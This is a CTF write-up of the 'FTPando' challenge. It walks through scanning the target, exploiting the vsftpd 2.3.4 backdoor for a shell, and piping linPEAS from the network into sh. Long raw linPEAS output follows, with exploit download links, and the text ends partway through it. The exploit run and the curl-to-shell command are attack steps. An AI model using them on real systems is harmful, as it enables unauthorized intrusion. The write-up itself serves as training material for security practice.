+++
title = "🦻 [0x02] FTPando"
description = "Writeup for 'ftpando'"
date = "2022-06-14"
aliases = ["writeup", "writeups", "ctf", "ctfs"]
author = "cakehonolulu"
+++
<br>

![FTPando](/images/ctfs/nuclio_cyberhack/ftpando/ftpando.png)

<table>
<thead>
  <tr>
    <th>Difficulty</th>
    <td>Hard</td>
  </tr>
</thead>
<tbody>
  <tr>
    <th>Points</th>
    <td>95</td>
  </tr>
  <tr>
    <th>Category</th>
    <td>Multiple (Web Services, CVE's...)</td>
  </tr>
</tbody>
</table>

# Description
<br>
<img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/openmoji/292/flag-for-catalonia-esct_1f3f4-e0065-e0073-e0063-e0074-e007f.png" width="20px" height="20px" style="vertical-align: bottom;">
Això sí, aconseguir el token no serà gens fàcil. Hauràs d'utilitzatr diferents tècniques i encadenar-ne diverses juntes.

Així que ja n'hi ha prou de xerrada per ara.

El teu objectiu? La propera màquina:
caixa1.hackrocks.com

Bona sort!
<br>
<br>
🇺🇸 Getting the token won't be easy. You'll have to concatenate different techniques to get it.

Let's stop talking.

Your objective? This machine:
caixa1.hackrocks.com

Good luck!
<br>

# Solution walkthrough
<br>
We'll start with an <code>nmap</code> scan, we'll try to find all available open ports.
<br>
<br>
{{< highlight bash >}}
$ nmap -p- caixa1.hackrocks.com --min-rate 10000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 17:50 CEST
Warning: 157.90.235.13 giving up on port because retransmission cap hit (10).
Nmap scan report for caixa1.hackrocks.com (157.90.235.13)
Host is up (0.049s latency).
rDNS record for 157.90.235.13: static.13.235.90.157.clients.your-server.de
Not shown: 35168 closed tcp ports (conn-refused), 30365 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
2121/tcp open  ccproxy-ftp

Nmap done: 1 IP address (1 host up) scanned in 56.17 seconds
{{< /highlight >}}

Now, we'll proceed to scan each of the two ports (There are more, but it's a bit janky to find them).

{{< highlight bash >}}
$ nmap -sCV -p 22,2121 caixa1.hackrocks.com --min-rate 10000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 17:53 CEST
Nmap scan report for caixa1.hackrocks.com (157.90.235.13)
Host is up (0.060s latency).
rDNS record for 157.90.235.13: static.13.235.90.157.clients.your-server.de

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:e8:4e:bb:17:64:3d:09:3b:be:52:fe:d6:be:9d:eb (RSA)
|   256 c0:e1:23:3b:fe:21:30:51:aa:34:3d:53:74:22:ac:d7 (ECDSA)
|_  256 8c:71:9b:ac:cc:c2:b7:87:67:2c:37:25:e8:9c:74:4a (ED25519)
2121/tcp open  ftp     vsftpd 2.3.4
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.08 seconds
{{< /highlight >}}

Few things to note:

<code>OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</code> is bundled with Ubuntu 20.04 Local Fossa.

If you try connecting to the SSH port you'll be greeted with:

{{< highlight bash >}}
$ ssh caixa1.hackrocks.com -p 22
The authenticity of host 'caixa1.hackrocks.com (157.90.235.13)' can't be established.
ED25519 key fingerprint is SHA256:~BLANK~.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'caixa1.hackrocks.com' (ED25519) to the list of known hosts.
 _                _                   _        
| |__   __ _  ___| | ___ __ ___   ___| | _____ 
| '_ \ / _` |/ __| |/ / '__/ _ \ / __| |/ / __|
| | | | (_| | (__|   <| | | (_) | (__|   <\__ \
|_| |_|\__,_|\___|_|\_\_|  \___/ \___|_|\_\___/
                                               
    BTW, nothing to see here. Search for other
    interesting ports to attack!
user@caixa1.hackrocks.com's password:
{{< /highlight >}}

So, no luck with SSH.

Let's continue with the FTP port.

It says that it's running <code>vsftpd 2.3.4</code> so let's look for vulnerabilities.

Lo and behold, we find an exploit in <code>exploit-db.com</code>.

We can use this exploit to obtain RCE on the server through the <code>vsftpd</code> service.

I decided to use [this one](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit) specifically, as it gets us a reverse shell on the server.

Note that it's very unstable; I'm not quite sure if it's due to the exploit being unstable, the server being unstable
or a combination of both factors.

Anyways, let's clone it and run it:

{{< highlight bash >}}
$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit
$ cd vsftpd_2.3.4_Exploit/
$ python3 exploit.py 157.90.235.13
[<] Checking Version...
[-] Opening connection to 157.90.235.13 on port 21: Failed
[ERROR] Could not connect to 157.90.235.13 on port 21
Traceback (most recent call last):
  File "/home/cakehonolulu/Documents/vsftpd_2.3.4_Exploit/exploit.py", line 44, in <module>
    exploit.trigger_backdoor()
  File "/home/cakehonolulu/Documents/vsftpd_2.3.4_Exploit/exploit.py", line 15, in trigger_backdoor
    io = remote(self.ip,self.port)
  File "/home/cakehonolulu/.local/lib/python3.10/site-packages/pwnlib/tubes/remote.py", line 77, in __init__
    self.sock   = self._connect(fam, typ)
  File "/home/cakehonolulu/.local/lib/python3.10/site-packages/pwnlib/tubes/remote.py", line 126, in _connect
    self.error("Could not connect to %s on port %d", self.rhost, self.rport)
  File "/home/cakehonolulu/.local/lib/python3.10/site-packages/pwnlib/log.py", line 424, in error
    raise PwnlibException(message % args)
pwnlib.exception.PwnlibException: Could not connect to 157.90.235.13 on port 21
{{< /highlight >}}

If you look carefully, it doesn't work right away; we need to adjust the exploit a little bit to adjust it to our needs.

Open exploit.py with your favourite text editor and replace:

{{< highlight python >}}
...
class ExploitFTP:
        def __init__(self,ip,port=21):
...
{{< /highlight >}}

...with...

{{< highlight python >}}
...
class ExploitFTP:
        def __init__(self,ip,port=2121):
...
{{< /highlight >}}

...and re-run the script:

{{< highlight bash >}}
$ python3 exploit.py 157.90.235.13
[+] Got Shell!!!
[+] Opening connection to 157.90.235.13 on port 2121: Done
[*] Closed connection to 157.90.235.13 port 2121
[+] Opening connection to 157.90.235.13 on port 6200: Done
[*] Switching to interactive mode
$ 
{{< /highlight >}}

It works now, alright.

Let's get onto the spicy stuff, now that we have a shell, we need to escalate privileges.

As always, <code>PEASS-ng</code> comes to our rescue.

We download the <code>linPEAS</code> script and run it:

{{< highlight bash >}}
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 
{{< /highlight >}}

<details>
<summary>Script output:</summary>
<br>
{{< highlight bash >}}

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄\\x96\x84▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄\x1b[48;2;239;143;2m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄             \x1b[48;2;255;147;0m     ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄\x1b[38;2;224;131;0m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄   \x1b[48;2;73;218;37m     ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄\\x96\x84▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------| 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 5.4.0-117-generic (buildd@lcy02-amd64-006) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #132-Ubuntu SMP Thu Jun 2 00:39:06 UTC 2022
User & Groups: uid=1001(ftpuser) gid=1001(ftpuser) groups=1001(ftpuser)
Hostname: ftpando
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.4.0-117-generic (buildd@lcy02-amd64-006) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #132-Ubuntu SMP Thu Jun 2 00:39:06 UTC 2022
Distributor ID:    Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:    20.04
Codename:    focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

╔══════════╣ CVEs Check
sh: 1197: [[: not found
sh: 1197: rpm: not found
sh: 1197: 0: not found
sh: 1207: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Wed 15 Jun 2022 06:13:55 PM UTC
 18:13:55 up 12 min,  0 users,  load average: 0.22, 0.08, 0.06

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda14
sda15

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
/dev/disk/by-uuid/64a65c41-0a19-4f9c-b68b-8577bc58b2e0 / ext4 defaults 0 0
/dev/disk/by-uuid/9BE6-9733 /boot/efi vfat defaults 0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
USER=ftpuser
HOME=/home/ftpuser
LOGNAME=ftpuser
JOURNAL_STREAM=9:19936
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=395fe9f327594660a0eea3656b06a9bb
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/sh
PWD=/
TZ=UTC-02:00
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (kvm)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root           1  0.2  0.5 101696 11184 ?        Ss   18:01   0:01 /sbin/init
root         337  0.0  0.7  67836 14880 ?        S<s  18:01   0:00 /lib/systemd/systemd-journald
root         368  0.0  0.2  18688  4976 ?        Ss   18:01   0:00 /lib/systemd/systemd-udevd
root        1965  0.0  0.1  18688  2776 ?        S    18:13   0:00  _ /lib/systemd/systemd-udevd
root         498  0.0  0.9 214668 17996 ?        SLsl 18:01   0:00 /sbin/multipathd -d -s
systemd+     524  0.0  0.3  90188  5988 ?        Ssl  18:01   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+     535  0.0  0.3  26572  7608 ?        Ss   18:01   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     537  0.0  0.5  23856 11852 ?        Ss   18:01   0:00 /lib/systemd/systemd-resolved
message+     581  0.0  0.2   7592  4340 ?        Ss   18:01   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         591  0.0  0.9  29660 18452 ?        Ss   18:01   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         597  0.0  0.1   6812  2928 ?        Ss   18:01   0:00 /usr/sbin/cron -f
root         598  0.0  0.1   6444  3624 ?        Ss   18:01   0:00 /usr/sbin/qemu-ga
syslog       599  0.0  0.2 224344  4864 ?        Ssl  18:01   0:00 /usr/sbin/rsyslogd -n -iNONE
root         601  0.0  0.3  16532  7504 ?        Ss   18:01   0:00 /lib/systemd/systemd-logind
root         603  0.0  0.6 392520 11972 ?        Ssl  18:01   0:00 /usr/lib/udisks2/udisksd
daemon\x1b[0m       611  0.0  0.1   3792  2268 ?        Ss   18:01   0:00 /usr/sbin/atd -f
ftpuser      619  0.0  0.0   2860  1568 ?        Ss   18:01   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
ftpuser      833  0.0  0.0   2608   532 ?        Ss   18:13   0:00  _ sh
ftpuser      835  0.5  0.7  34888 13956 ?        S    18:13   0:00      _ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
ftpuser      836  0.3  0.1   3692  2668 ?        S    18:13   0:00      _ sh
ftpuser     3608  0.0  0.0   3692  1120 ?        S    18:13   0:00          _ sh
ftpuser     3612  0.0  0.1   9040  3260 ?        R    18:13   0:00          |   _ ps fauxwww
ftpuser     3611  0.0  0.0   3692  1120 ?        S    18:13   0:00          _ sh
root         631  0.0  0.1   5600  2112 ttyS0    Ss+  18:01   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root         636  0.0  0.0   5828  1732 tty1     Ss+  18:01   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root         637  0.0  0.3 232712  6908 ?        Ssl  18:01   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         638  0.0  1.0 107908 21016 ?        Ssl  18:01   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF  NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 Not Found
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jun 12 06:25 .
drwxr-xr-x 98 root root 4096 Jun 13 07:26 ..
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  191 Feb  1  2021 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x\x1b[1;32m  2 root root 4096 Jun 13 07:26 .
drwxr-xr-x 98 root root 4096 Jun 13 07:26 ..
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
\x1b[0m-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Dec  7  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  1  2021 .
drwxr-xr-x 98 root root 4096 Jun 13 07:26 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root\x1b[0m root 4096 Feb  1  2021 .
drwxr-xr-x 98 root root 4096 J\x1b[0mun 13 07:26 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Sep 13  2021 .
drwxr-xr-x 98 root root 4096 Jun 13 07:26 ..
-rwxr-xr-x  1 root root  813 Feb 25  2020 man-db
-rw-r--r--  1 root ro\x1b[1;32mot  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  403 Aug  5  2021 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/atd.service is executing some relative path
/etc/systemd/system/multi-user.target.wants/grub-common.service is executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                     
Wed 2022-06-15 18:16:05 UTC 2min 6s left  n/a                         n/a          systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2022-06-15 18:36:19 UTC 22min left    Wed 2022-06-15 16:52:54 UTC 1h 21min ago ua-messaging.timer           ua-messaging.service          
Thu 2022-06-16 00:00:00 UTC 5h 46min left Wed 2022-06-15 00:00:02 UTC 18h ago      logrotate.timer              logrotate.service             
Thu 2022-06-16 00:00:00 UTC 5h 46min left Wed 2022-06-15 00:00:02 UTC 18h ago      man-db.timer                 man-db.service                
Thu 2022-06-16 01:49:39 UTC 7h left       Wed 2022-06-15 00:09:48 UTC 18h ago      apt-daily.timer              apt-daily.service             
Thu 2022-06-16 03:28:55 UTC 9h left       Wed 2022-06-15 17:49:59 UTC 23min ago    motd-news.timer              motd-news.service             
Thu 2022-06-16 04:03:26 UTC 9h left       Wed 2022-06-15 10:48:05 UTC 7h ago       fwupd-refresh.timer          fwupd-refresh.service         
Thu 2022-06-16 06:30:47 UTC 12h left      Wed 2022-06-15 06:06:17 UTC 12h ago      apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sun 2022-06-19 03:10:56 UTC 3 days left   Sun 2022-06-12 03:10:30 UTC 3 days ago   e2scrub_all.timer            e2scrub_all.service           
Mon 2022-06-20 00:00:00 UTC 4 days left   Mon 2022-06-13 00:00:01 UTC 2 days ago   fstrim.timer                 fstrim.service                

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/cloud-init.target.wants/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/usr/lib/systemd/system/cloud-init-hotplugd.socket is calling this writable listener: /run/cloud-init/hook-hotplug-cmd
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/org/kernel/linux/storage/multipathd
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmpolld.socket
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                           PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION
:1.0                           535 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
:1.1                           524 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service   -       -
:1.15                         6224 busctl          ftpuser          :1.15         vsftpd.service              -       -
:1.2                           537 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
:1.3                           601 systemd-logind  root             :1.3          systemd-logind.service      -       -
:1.4                             1 systemd         root             :1.4          init.scope                  -       -
:1.5                           603 udisksd         root             :1.5          udisks2.service             -       -
:1.6                           591 networkd-dispat root             :1.6          networkd-dispatcher.service -       -
:1.7                           637 polkitd         root             :1.7          polkit.service              -       -
:1.8                           638 unattended-upgr root             :1.8          unattended-upgrades.service -       -
com.ubuntu.SoftwareProperties    - -               -                (activatable) -                           -       -
io.netplan.Netplan               - -               -                (activatable) -                           -       -
org.freedesktop.DBus             1 systemd         root             -             init.scope                  -       -
org.freedesktop.PackageKit       - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1     637 polkitd         root             :1.7          polkit.service              -       -
org.freedesktop.UDisks2        603 udisksd         root             :1.5          udisks2.service             -       -
org.freedesktop.bolt             - -               -                (activatable) -                           -       -
org.freedesktop.fwupd            - -               -                (activatable) -                           -       -
org.freedesktop.hostname1        - -               -                (activatable) -                           -       -
org.freedesktop.locale1          - -               -                (activatable) -                           -       -
org.freedesktop.login1         601 systemd-logind  root             :1.3          systemd-logind.service      -       -
org.freedesktop.network1       535 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
org.freedesktop.resolve1       537 systemd-resolve systemd-resolve  :1.2          systemd-resolved.service    -       -
org.freedesktop.systemd1         1 systemd         root             :1.4          init.scope                  -       -
org.freedesktop.timedate1        - -               -                (activatable) -                           -       -
org.freedesktop.timesync1      524 systemd-timesyn systemd-timesync :1.1          systemd-timesyncd.service   -       -


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                        ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
ftpando
127.0.1.1 ftpando ftpando
127.0.0.1 localhost

::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts


nameserver 127.0.0.53
options edns0 trust-ad

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
